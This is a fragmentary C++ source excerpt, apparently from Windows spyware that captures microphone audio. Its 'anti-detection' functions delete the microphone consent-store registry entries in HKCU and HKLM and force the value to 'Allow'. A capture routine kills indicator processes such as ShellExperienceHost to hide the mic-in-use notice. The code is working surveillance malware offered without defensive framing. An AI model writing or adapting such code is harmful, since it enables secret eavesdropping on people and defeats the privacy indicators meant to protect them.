...
void AudioKillIndicatorProcesses();
...
// ===== AUDIO ANTI-DETECTION FUNCTIONS (copied from dllmain.cpp) =====
#ifndef BUILD_AS_DLL
// These are needed for standalone EXE mode.
...
static void AudioCleanMicRegistry() {
    ...
    // Recursively delete HKCU and HKLM
    HKEY hKey = nullptr;
    RegOpenKeyExW(HKEY_CURRENT_USER, micPath, 0, KEY_ALL_ACCESS, &hKey);
    if (hKey) { RegDeleteTreeW(hKey, L""); RegCloseKey(hKey); }
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, micPath, 0, KEY_ALL_ACCESS, &hKey);
    if (hKey) { RegDeleteTreeW(hKey, L""); RegCloseKey(hKey); }
    // Re-create empty key
    RegCreateKeyExW(HKEY_CURRENT_USER, micPath, 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr);
    if (hKey) { RegSetValueExW(hKey, L"Value", 0, REG_SZ, (const BYTE*)L"Allow", 12); RegCloseKey(hKey); }
    // Also delete NonPackaged subkey
    std::wstring npPath = std::wstring(micPath) + L"\\NonPackaged";
    RegDeleteTreeW(HKEY_CURRENT_USER, npPath.c_str());
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, npPath.c_str());
}
...
// ===== capture_audio_direct (modified cleanMicReg) =====
static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, int sampleRate, int bitrate, int channels) {
    ...
    auto cleanMicReg = []() {
        AudioKillIndicatorProcesses();   // kills ShellExperienceHost etc.
